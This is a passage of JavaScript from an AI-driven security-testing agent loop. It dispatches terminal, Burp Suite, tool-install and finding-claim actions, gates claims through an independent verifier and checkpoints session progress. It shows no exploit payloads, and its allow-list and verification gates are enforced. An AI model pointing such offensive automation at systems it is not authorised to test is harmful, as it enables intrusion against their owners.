                  const exitCode = parseTerminalExit(logText);
                  const body = logText.replace(/__DT_EXIT__:\d+\s*$/, '').replace(/__DT_NO_LOG__\s*$/, '').trim();
                  if (exitCode === null) {
                    // Still running (no exit marker yet) — report
                    // the partial output and how to read the rest;
                    // nothing is recorded in the ledger until the
                    // run completes.
                    observation = `Typed visibly into the terminal ("${termWin.title || 'Terminal'}") and pressed Return — the command is STILL RUNNING on the desktop (no exit marker yet). What it has printed so far:\n${body ? body.slice(0, OBS_BUDGET) : '(nothing yet)'}${shotName ? `\nDesktop screenshot saved as artifact ${shotName} — the owner watches it live.` : ''}\nRead the rest with a shell action: cat ${logFile}`;
                  } else {
                    let spillHandle = '';
                    let outText = body || `(command finished with no output, exit code ${exitCode})`;
                    if (outText.length > OBS_BUDGET) {
                      try { spillHandle = deps.spill(huntId, outText); } catch { /* best-effort */ }
                      outText = outText.slice(0, OBS_BUDGET) + `\n[output truncated on screen — ${body.length} chars total${spillHandle ? `, saved in full as artifact ${spillHandle}` : ''}]`;
                    }
                    observation = `Ran visibly in the terminal ("${termWin.title || 'Terminal'}") — the owner watched it live. Exit code ${exitCode}${shotName ? ` · desktop screenshot ${shotName}` : ''}:\n${outText}`;
                    try {
                      sessionOutputs = recordOutput(sessionOutputs, { signature: termSig, tool: 'shell', detail: command, output: observation, artifact: spillHandle, forced: forceTerm, why: String(action.why || '') });
                      saveOutputs(huntId, sessionOutputs);
                    } catch { /* the ledger is best-effort — the turn already ran */ }
                  }
                }
              }
            }
          }
        }
      }
      note({ action: `desktop_terminal: ${command.slice(0, 160)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'desktop_click_control') {
      // REAL-HUMAN: click a NAMED CONTROL inside a GUI app via its
      // accessibility tree (AT-SPI). The brain names the control's
      // visible text ("Repeater", "Send") and optionally the window;
      // the helper resolves the name in the tree and performs the
      // click there — pixel coordinates are never in the choice set.
      // When the app exposes no tree (Java apps without the Access
      // Bridge, or AT-SPI missing from this image) the helper says
      // so, and the observation names the keyboard fallback instead
      // of pretending the click happened. The window-focus rule
      // still applies: desktop_click focuses a window, this presses
      // a button inside it.
      const controlName = String(action.control || '').trim().slice(0, 120);
      const windowSub = String(action.window || '').trim().slice(0, 120);
      if (!controlName) {
        observation = 'Nothing clicked — give the control\'s visible name, e.g. {"action":"desktop_click_control","control":"Repeater","window":"Burp Suite"}. Take desktop_snapshot first if you do not know the window titles, or list a window\'s controls by naming it.';
      } else {
        toolCall('desktop_click_control', controlName);
        try {
          const res = await deps.execRaw(huntId, clickControlCommand(controlName, windowSub), 20000, { bypassTmux: true });
          const parsed = parseAtspiOutput((res && res.stdout) || '');
          if (parsed.ok) {
            if (parsed.clicked && parsed.clicked.window) {
              sessionDesktopState = markWindowInteracted(sessionDesktopState, parsed.clicked.window);
            } else if (windowSub) {
              sessionDesktopState = markWindowInteracted(sessionDesktopState, windowSub);
            }
            observation = atspiSuccessObservation(parsed.clicked);
          } else {
            observation = atspiFailureObservation(parsed.error);
          }
        } catch (err) {
          observation = atspiFailureObservation(`the click command failed: ${err.message || err}`);
        }
      }
      note({ action: `desktop_click_control: ${controlName.slice(0, 80)}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'launch_tool') {
      // TOOLS/OS AUTONOMY: launch a NAMED tool from the registry and
      // wait for it to be ready. GUI tools open on the desktop (the
      // observation is a fresh screen map); CLI tools are verified
      // present with their version. A repeat launch just reports
      // "already running" — it never starts a second copy. The first
      // Burp launch in a hunt also runs the first-use path (wizard,
      // proxy, target in Burp's browser) and records it in the hunt
      // memory, so the brain only ever says "launch burp".
      const toolId = String(action.tool || '').trim().toLowerCase().slice(0, 80);
      const resolved = resolveTool(toolId);
      if (!resolved.ok) {
        observation = `${resolved.error} (available: ${TOOL_IDS.join(', ')})`;
      } else if (resolved.tool.kind === 'gui') {
        toolCall('launch_tool', toolId);
        try {
          let firstUse = null;
          if (toolId === 'burp') {
            try { firstUse = burpFirstUseDone(deps.readMeta(huntId) || {}); } catch { firstUse = false; }
          }
          if (toolId === 'burp' && firstUse === false) {
            const res = await burpFirstUse(huntId, target, deps);
            observation = res.ok ? res.observation : `Burp first-use did not complete: ${res.error || res.observation}`;
            try { await recordToolState(huntId, 'burp', { ...res.state }, deps); } catch { /* best-effort */ }
          } else {
            const res = await launchGuiTool(huntId, toolId, deps);
            if (res.ok) {
              if (res.window) sessionDesktopState = markWindowInteracted(sessionDesktopState, res.title || toolId);
              observation = res.observation;
              try { await recordToolState(huntId, toolId, { running: true, via: res.via, window: res.window || '' }, deps); } catch { /* best-effort */ }
            } else {
              observation = res.error;
            }
          }
        } catch (err) {
          observation = `Tool launch failed: ${err.message || err}`;
        }
      } else {
        toolCall('launch_tool', toolId);
        try {
          const res = await checkCliTool(huntId, toolId, deps);
          if (res.ok) {
            observation = res.observation;
            try { await recordToolState(huntId, toolId, { running: true, version: String(res.version || '').slice(0, 120) }, deps); } catch { /* best-effort */ }
          } else {
            observation = res.error;
          }
        } catch (err) {
          observation = `Tool check failed: ${err.message || err}`;
        }
      }
      note({ action: `launch_tool: ${toolId}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'download_tool') {
      // TOOLS/OS AUTONOMY: install a MISSING tool from the
      // allow-list. Anything not listed is refused BEFORE any exec
      // — the refusal names the installable tools, so the brain can
      // pick a real one instead of guessing.
      const toolId = String(action.tool || '').trim().toLowerCase().slice(0, 80);
      toolCall('download_tool', toolId);
      try {
        const res = await downloadTool(huntId, toolId, deps);
        observation = res.ok ? res.observation : res.error;
        if (res.ok) {
          try { await recordToolState(huntId, toolId, { running: true, installedVia: 'download_tool' }, deps); } catch { /* best-effort */ }
        }
      } catch (err) {
        observation = `Tool install failed: ${err.message || err}`;
      }
      note({ action: `download_tool: ${toolId}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'list_controls') {
      // TOOLS/OS AUTONOMY: list a window's NAMED controls from its
      // accessibility tree, as clickable map lines. Read-only — it
      // never clicks anything, so it is not dedupe-gated (like
      // browser_snapshot). When the app exposes no tree, the
      // observation names the OCR fallback instead of pretending
      // the list worked.
      const windowSub = String(action.window || '').trim().slice(0, 120);
      toolCall('list_controls', windowSub);
      try {
        const res = await listToolControls(huntId, windowSub, deps);
        observation = res.ok ? res.observation : res.error;
      } catch (err) {
        observation = `Could not list controls: ${err.message || err}. Fall back to see_screen and desktop_click_at.`;
      }
      note({ action: `list_controls: ${windowSub || '(active window)'}`, why: thinkingText, result: clipResult(observation), learned: '' });
    } else if (kind === 'claim_finding') {
      const rawTitle = String(action.title || '');
      const title = String(rawTitle.trim() ? rawTitle : 'Untitled claim').slice(0, 200);
      const evidence = String(action.evidence || '');
      const command = String(action.command || lastShellCommand || '');
      // COMPLETE-THE-PROOF GATE (Lane N): the filing is checked for
      // completeness BEFORE the verifier is invoked and before any
      // finding is recorded. An incomplete claim is not recorded and
      // the verifier never sees it; the brain gets one observation
      // naming every missing piece, and the refusal is recorded as a
      // countable claim_bounce event. The gate judges completeness
      // only — assessResult below remains the sole judge of truth.
      const poc = String(action.poc || '').trim().slice(0, 120);
      let pocExists = false;
      if (poc) {
        try { pocExists = Boolean(deps.pocExists(huntId, poc)); } catch { pocExists = false; }
      }
      const gate = claimGateCheck({
        title: rawTitle,
        cls: normaliseCoverageClass(action.class) || claimClassFromTitle(rawTitle),
        command,
        poc,
        pocExists,
        evidence,
        counterevidence: action.counterevidence,
        confidence: action.confidence,
        rationale: action.confidence_rationale,
      });
      // CLAIM-TITLE GUARD (#318): probe/test names, plan-echo titles and
      // already-verified duplicates must never reach the verifier.
      // Previously only read paths (panel/chat/admin) filtered probe
      // titles; the filing path never ran the guard, so probe titles
      // could be filed AND verified. Bounce BEFORE acting on the gate,
      // with the guard's own message (it names the fix: re-title).
      let titleGuard = null;
      try {
        const titleEvents = (() => { try { return deps.readEvents(huntId) || []; } catch { return []; } })();
        titleGuard = guardClaimTitle(rawTitle, titleEvents);
      } catch { titleGuard = null; }
      if (titleGuard && !titleGuard.ok) {
        try { deps.record(huntId, { type: 'claim_bounce', tool: 'claim_finding', detail: title, error: titleGuard.error, via: 'human-mode' }); } catch { /* best-effort */ }
        say(`Claim bounced — ${titleGuard.error}.`);
        observation = titleGuard.message;
        note({ action: `claim_finding: ${title}`, why: thinkingText, result: clipResult(observation), learned: '' });
      } else if (!gate.ok) {
        try { deps.record(huntId, { type: 'claim_bounce', tool: 'claim_finding', detail: title, missing: gate.missing.map((m) => m.field), via: 'human-mode' }); } catch { /* best-effort */ }
        say(`Claim bounced — incomplete proof package (missing: ${gate.missing.map((m) => m.field).join(', ')}).`);
        observation =
          'CLAIM NOT RECORDED — the proof package is incomplete, so the verifier never saw it. Missing: ' +
          gate.missing.map((m) => m.hint).join('; ') +
          '. Complete every piece and claim again — run the control/baseline probe first if that is what is missing. This gate checks completeness only; the verifier still decides whether a complete claim is true.';
        note({ action: `claim_finding: ${title}`, why: thinkingText, result: clipResult(observation), learned: '' });
      } else {
      toolCall('claim_finding', title);
      const assess = await getAssess();
      if (assess) {
        // The pipeline verifier decides — never the hunter. It
        // re-runs the reproducing command, applies the evidence gate,
        // the 4-step verification and the content-relevance judgement,
        // and records the finding event itself.
        const plan = {
          test: title,
          command,
          why: 'Human-mode claim — the hunter reproduced this itself and asked for independent verification.',
          hypothesis: title,
        };
        const result = { stdout: evidence, stderr: '', code: 0 };
        let rec = null;
        try {
          rec = await assess(huntId, target, plan, result);
        } catch (err) {
          observation = `Verification could not run (${err.message || err}). Your claim was NOT verified — reproduce it cleanly and claim again with the exact command + output.`;
        }
        if (rec) {
          if (rec.verified) {
            newFindings.push(rec);
            if (Array.isArray(opts.findings)) opts.findings.push(rec);
            observation = `VERIFIED by the independent verifier: "${rec.title}" (${rec.severity}). It counts. Think about impact and chaining — what does this unlock?`;
          } else {
            observation = `NOT verified: ${rec.verification || 'the verifier rejected the claim'}. A rejected claim is a dead end, not a finding — either your evidence does not prove it, or the command does not reproduce it. Do not re-claim the same thing; dig for real proof or move on.`;
            // PROOF-COMPLETE (gate-replay lane): a rejected claim
            // restarts its proof count — the brain needs NEW
            // evidence, and the counter must not keep the claim
            // blocked. Reset every key for this claim's endpoint,
            // under the claim's class and under the command's
            // payload class (either may be the probe key).
            try {
              const ep = proofEndpointOfCommand(command);
              const classes = new Set();
              const cc = normaliseCoverageClass(action.class) || claimClassFromTitle(rawTitle);
              if (cc) classes.add(String(cc).toLowerCase());
              const pc = classifyPayloadClass(command);
              if (pc && pc !== 'credential') classes.add(pc);
              let changed = false;
              for (const cls of classes) {
                const key = `${ep}|${cls}`;
                if (ep && proofCounts.has(key)) { proofCounts.delete(key); changed = true; }
              }
              if (changed) persistProofCounts();
            } catch { /* reset is best-effort */ }
          }
        }
      } else {
        // No verifier wired (bare driver without the pipeline): the
        // claim is recorded as what it is — UNVERIFIED. It must never
        // be presented as a confirmed finding anywhere.
        try {
          deps.record(huntId, {
            type: 'finding',
            class: 'agent_finding',
            title,
            severity: 'medium',
            url: target,
            evidence: { request: command, response: evidence.slice(0, 3000) },
            verified: false,
            verification: 'human-mode claim — pending pipeline verification',
            via: 'human-mode',
          });
        } catch { /* best-effort */ }
        observation = 'Recorded as an UNVERIFIED claim (no pipeline verifier is wired into this session). It does not count as a finding until the verifier confirms it.';
      }
      note({ action: `claim_finding: ${title}`, why: thinkingText, result: clipResult(observation), learned: '' });
      }
    } else {
      observation = `Unknown action "${kind}". Valid actions: shell, search, write_file, note, recall, record_coverage, hunt_plan, load_skill, proxy_start, intercept_list, intercept_read, intercept_replay, browser_open, browser_snapshot, browser_click, browser_type, screenshot, desktop_snapshot, desktop_click, desktop_key, desktop_screenshot, desktop_terminal, desktop_click_control, see_screen, desktop_click_at, launch_tool, download_tool, list_controls, claim_finding, save_credential, use_saved_credential, fetch_verification_code. Pick exactly one, as JSON on the last line.`;
    }

    // Lane F: remember what the executed action returned, so a later
    // repeat attempt can be answered with its last result.
    if (pendingSig) {
      const entry = actionHistory.get(pendingSig);
      if (entry) {
        entry.lastResult = String(observation).slice(0, 220);
        // Lane AF: the execution was counted as full at dispatch;
        // if the GUI result says it was really the look-only
        // fallback, reclassify it — the full count comes back off,
        // the streak it interrupted is restored and incremented —
        // and persist the amendment as a paired tool_degraded event
        // so the next session's rebuilt history replays the same
        // accounting from the same record.
        if (pendingDegraded) {
          entry.fullCount = Math.max(0, (entry.fullCount || 0) - 1);
          entry.degradedStreak = pendingPrevStreak + 1;
          try { deps.record(huntId, { type: 'tool_degraded', tool: entry.tool, detail: entry.detail, via: 'human-mode' }); } catch { /* best-effort */ }
        }
      }
      pendingSig = null;
      pendingDegraded = false;
    }

    // PROOF-COMPLETE (gate-replay lane, 28 Oct 2026): a probe that
    // returns signal-bearing, non-error output proves its claim
    // once more. The signature is the one captured before execution
    // (proofSig), so a navigation the probe caused cannot change
    // the key. Blocked / paused turns carry no proof (their
    // observation is a gate text, not probe output — the !proofHit
    // guard keeps a proof-blocked turn from counting itself);
    // claim_finding itself is never a probe. The count persists to
    // meta so the next session inherits it.
    if ((kind === 'shell' || kind === 'browser_type') && !proofHit && proofSig && observation && !/^(BLOCKED|PAUSED)/.test(String(observation))) {
      try {
        const cmdForProof = kind === 'shell' ? String(action.command || '') : '';
        if (probeProvesClaim({ output: observation, command: cmdForProof })) {
          proofCounts.set(proofSig.key, (proofCounts.get(proofSig.key) || 0) + 1);
          persistProofCounts();
        }
      } catch { /* proof counting is best-effort */ }
    }

    // MISSION Stage 2+3 (31 Oct 2026): structured plan + explicit action
    // verification. If the brain attached a plan (action.plan), record its
    // objective/state/risk on the observation. If it declared what it
    // expected (action.expect), check it against the fresh observation and
    // the current page URL, and append the verdict. VERIFIED means the
    // intended state change is proven; NOT VERIFIED surfaces the plan's
    // fallback — the brain must diagnose and retry, never assume success.
    try {
      const planParsed = parsePlan(action.plan);
      const plan = planParsed.valid ? planParsed.plan : null;
      if (plan) {
        const parts = [];
        if (plan.objective) parts.push(`objective: ${plan.objective}`);
        if (plan.state) parts.push(`state: ${plan.state}`);
        if (plan.risk) parts.push(`risk: ${plan.risk}`);
        if (parts.length > 0) observation = `${observation}\n[PLAN] ${parts.join(' | ')}`;
      }
      const expectText = action && typeof action.expect === 'string' ? action.expect.trim() : '';
      if (expectText) {
        const verdict = verifyExpectation({ expect: expectText, observation, pageUrl: currentPageUrl });
        if (verdict.checked) {
          observation = `${observation}\n[EXPECTATION ${verdict.verified ? 'VERIFIED' : 'NOT VERIFIED'}] ${verdict.evidence}`;
          // MISSION Stage 6 (31 Oct 2026): UI observability — emit a
          // structured verification event so the frontend can display
          // real Verified/Failed status instead of inferring it.
          try {
            deps.record(huntId, {
              type: 'verification',
              action: kind,
              verified: verdict.verified,
              evidence: scrub(String(verdict.evidence)).slice(0, 300),
              via: 'human-mode',
            });
          } catch { /* observability is best-effort */ }
          // MISSION Stage 4 (31 Oct 2026): the Learn step — synthesize what
          // this turn taught us from the verification verdict, so the
          // lesson is explicit in the loop's observable state and the next
          // screen, not just implied. VERIFIED confirms the premise;
          // NOT VERIFIED retires the approach for this turn.
          const actionLabel = (() => {
            try {
              const d = action.text || action.command || action.url || action.target || '';
              return `${kind}${d ? ` '${String(d).slice(0, 60)}'` : ''}`;
            } catch { return kind; }
          })();
          observation = `${observation}\n[LEARNED] ${actionLabel}: ${verdict.verified ? 'premise CONFIRMED' : 'approach FAILED'} — ${verdict.evidence}`;
          if (!verdict.verified) {
            const fb = fallbackLine(plan);
            if (fb) observation = `${observation}\n${fb}`;
          }
        }
      }
    } catch { /* plan/verification never breaks the loop */ }

    // Lane AI: the session log is scrubbed like every other
    // recorded surface — a one-turn secret (generated password,
    // verification code) rides lastObservation to the next screen
    // in memory, but never lands in this log.
    log.push({ turn, action: kind, detail: scrub(detailForAction(kind, action)), observation: scrub(String(observation)).slice(0, 300) });
    lastObservation = observation;

    // POST-DISPATCH FILER SWEEP (#316): file dispatch-produced evidence
    // this turn, not next turn — and never lose it to session end.
    try { await sweepPostDispatchEvidence(observation); } catch { /* sweep never breaks the loop */ }

    // VISIBLE-DESKTOP-FIRST: fold this turn's executed actions
    // into the previous-turn record the NEXT screen's nudge is
    // computed from — a shell-only interactive turn (or a shell
    // login, which leaves the visible browser logged out) earns
    // the desktop nudge next turn. The task text is the brain's
    // current task; a turn with no task block is judged on its
    // shell login alone.
    prevTurnDesktop = { kinds: [...turnKinds], task: String((sessionCurrentTask && sessionCurrentTask.task) || ''), shellLogin: turnShellLogin };

    // PROGRESS CHECKPOINT (Lane P, 23 Oct 2026): the hunt's totals
    // used to move only at session end, so during a whole 6-turn
    // session (10+ minutes on the 8B brain) meta.humanLoop.turnsTotal
    // stood still and the website's hunt looked frozen at the round
    // it resumed from — the owner's live QA watched round 166 for
    // ~12 minutes while the backend was in fact writing reasoning
    // rows and events. Persist the running total after EVERY turn
    // through the guarded checkpoint writer (owner pause/stop holds
    // are preserved; progress fields still record). Best-effort: a
    // failed checkpoint never costs the turn.
    try {
      const cur = deps.readMeta(huntId) || {};
      const curLoop = cur.humanLoop || {};
      // INFINITY LEVEL: the loop counters ride the same per-turn
      // checkpoint — the parent can read meta.humanLoop.loopCounters
      // at any moment and see snapshots taken/acted on, clicks,
      // distinct pages/elements, and payloads planned vs sent.
      let turnCounters = null;
      try {
        const ev = deps.readEvents(huntId) || sessionEvents;
        let rows = [];
        try { rows = getAllReasoning(huntId) || []; } catch { /* rows are best-effort */ }
        turnCounters = loopCounters({ events: ev, reasoningRows: rows, pageState: sessionPageState });
      } catch { /* counters are best-effort */ }
      deps.writeMeta(huntId, {
        ...cur,
        huntId,
        humanLoop: {
          ...curLoop,
          turnsTotal: sessionBaseTurns + turnsRun,
          lastTurnAt: new Date().toISOString(),
          ...(turnCounters ? { loopCounters: turnCounters } : {}),
          // KEYWORD-INDEX: the current task rides the per-turn
          // checkpoint (writeHuntMetaCheckpoint preserves an
          // owner pause/stop hold around it, like every progress
          // field). sessionTaskSeen lets a completed task CLEAR
          // the stale currentTask instead of leaving it standing.
          ...(sessionTaskSeen ? { currentTask: sessionCurrentTask } : {}),
          ...(sessionLastCompletedTask ? { lastCompletedTask: sessionLastCompletedTask } : {}),
        },
        checkpointAt: new Date().toISOString(),
      });
    } catch { /* progress checkpoint is best-effort */ }
  }

  // Checkpoint: session totals on the hunt meta under humanLoop,
  // plus the LEFT-OFF hand-off (Lane I): where this session stopped —
  // its last actions WITH detail and result, its last note, its open
  // threads, and the tail of its train of thought — so the next
  // session resumes as the same person, not a cold stranger.
  try {
    const m = deps.readMeta(huntId) || {};
    const prev = m.humanLoop || {};
    let endEvents = sessionEvents;
    try {
      endEvents = deps.readEvents(huntId) || sessionEvents;
    } catch { /* fall back to the session-start read */ }
    let endRows = [];
    try {
      endRows = getAllReasoning(huntId) || [];
    } catch { /* reasoning read is best-effort */ }
    let lastNote = sessionLastNote;
    if (!lastNote) {
      for (let i = endRows.length - 1; i >= 0 && !lastNote; i--) {
        const r = endRows[i];
        if (r && r.action === 'note to self') lastNote = String(r.learned || r.why || '');
      }
    }
    if (!lastNote) {
      for (let i = endEvents.length - 1; i >= 0 && !lastNote; i--) {
        const e = endEvents[i];
        if (e && e.type === 'thinking' && String(e.text || '').startsWith('Note to self:')) {
          lastNote = String(e.text).slice('Note to self:'.length).trim();
        }
      }
    }
    let openThreads = [];
    try {
      openThreads = researchedNotProbedLines({ events: endEvents, reasoningRows: endRows });
    } catch { /* open threads are best-effort */ }
    // Lane L (P4): session-end researched-vs-probed reconciliation.
    // The classes researched in THIS session's slice of the record
    // are diffed against probe actions and coverage rows; whatever
    // is unaccounted becomes an open item in this leftOff AND an
    // open_gap row in the coverage ledger, and the cumulative
    // research-debt counters are folded into the ledger. This is
    // memory bookkeeping about research debt — it never records a
    // probe that did not happen, and it writes no DOSSIER.md
    // (consolidation owns that file and regenerates it wholesale).
    try {
      const covData = loadCoverage(huntId);
      const sliceEvents = endEvents.length >= sessionEvents.length ? endEvents.slice(sessionEvents.length) : [];
      const sliceRows = endRows.slice(sessionRowCount);
      const rec = reconcileSessionResearch({ sessionEvents: sliceEvents, sessionRows: sliceRows, coverageData: covData, target });
      if (rec.gapInputs.length || rec.debtStats.length) {
        let next = covData;
        for (const g of rec.gapInputs) next = applyRecord(next, g).data;
        const huntProbed = new Set(
          researchedTopicStats({ events: endEvents, reasoningRows: endRows })
            .filter((s) => s.probed)
            .map((s) => s.topic.id),
        );
        for (const id of probedClassIds(next)) huntProbed.add(id);
        next = mergeResearchDebt(next, rec.debtStats, new Date().toISOString(), huntProbed);
        saveCoverage(huntId, next);
      }
      for (const item of rec.openItems) {
        const label = item.replace(/^-\s*/, '').split(':')[0];
        if (!openThreads.some((l) => l.includes(label))) openThreads.push(item);
      }
    } catch { /* reconciliation is best-effort bookkeeping */ }
    // Lane P: a dedup-BLOCKED attempt is not an action the hunter
    // took and must never be stored as the hand-off's last actions —
    // the next session reads those as its pending thread and retries
    // the exact repeat (live: browser_open /api/register, blocked in
    // one session, was already sitting in leftOff from the session
    // before and got retried again). Blocked attempts instead become
    // an explicit do-not-retry thread.
    const isBlockedRepeat = (l) => String((l && l.observation) || '').startsWith('BLOCKED — ALREADY DONE');
    const seenBlocked = new Set();
    for (const b of log.filter(isBlockedRepeat)) {
      const key = `${b.action}|${b.detail || ''}`;
      if (seenBlocked.has(key)) continue;
      seenBlocked.add(key);
      const line = `- Do NOT retry: ${b.action} ${clipLine(b.detail || '', 120)} — the already-done gate blocked it as an exact repeat; it is not your pending step. Choose a different action.`;
      if (!openThreads.some((t) => t.includes('Do NOT retry') && t.includes(clipLine(b.detail || '', 60)))) {
        openThreads.push(line);
      }
    }
    const leftOff = {
      at: new Date().toISOString(),
      lastActions: log.filter((l) => !isBlockedRepeat(l)).slice(-5).map((l) => ({
        tool: l.action,
        detail: clipLine(l.detail || '', 160),
        result: clipLine(l.observation || '', 220),
      })),
      lastNote: clipLine(lastNote || '', 300),
      openThreads,
      lastThinking: clipLine(sessionLastThinking || '', 240),
    };
    // FIX (#361): the session-end checkpoint used to rebuild humanLoop
    // WITHOUT spreading prev, so any loop field not carried forward
    // explicitly was dropped at hunt end (e.g. loopCounters when the
    // end recompute failed, or any field accumulated by another
    // session/version). Spread prev first — the per-turn pattern —
    // and let the explicit fields below override it.
    let endCounters = null;
    try {
      endCounters = loopCounters({ events: endEvents, reasoningRows: endRows, pageState: sessionPageState });
    } catch { /* counters are best-effort */ }
    deps.writeMeta(huntId, {
      ...m,
      huntId,
      humanLoop: {
        ...prev,
        sessions: (prev.sessions || 0) + 1,
        // Lane P: per-turn progress checkpoints already advanced
        // turnsTotal to sessionBaseTurns + turnsRun during this
        // session; adding turnsRun again here would double-count.
        // The max keeps the total correct whether or not the
        // per-turn writes landed (e.g. a no-op writeMeta in tests).
        turnsTotal: Math.max(prev.turnsTotal || 0, sessionBaseTurns + turnsRun),
        lastTurnAt: new Date().toISOString(),
        lastActions: log.slice(-6).map((l) => l.action),
        leftOff,
        ...(endCounters ? { loopCounters: endCounters } : {}),
        // KEYWORD-INDEX: the session-end checkpoint rebuilds the
        // humanLoop object, so the current task must be carried
        // explicitly — this session's block when one arrived, else
        // the previous session's standing task.
        ...(sessionTaskSeen ? { currentTask: sessionCurrentTask } : (prev.currentTask ? { currentTask: prev.currentTask } : {})),
        ...(sessionLastCompletedTask ? { lastCompletedTask: sessionLastCompletedTask } : (prev.lastCompletedTask ? { lastCompletedTask: prev.lastCompletedTask } : {})),
      },
    });
  } catch { /* checkpoint is best-effort */ }

  // FIX (#362, companion): aiOk is set only on a non-empty reply, so
  // !aiOk here means the brain never replied all session — report
  // failKind 'no_reply' (the signal the old early return carried)
  // so the driver still ends a dead-brain run with the streak.
  return { aiOk, failKind: aiOk ? null : 'no_reply', turnsRun, actionsRun: log.length, newFindings, log };
}
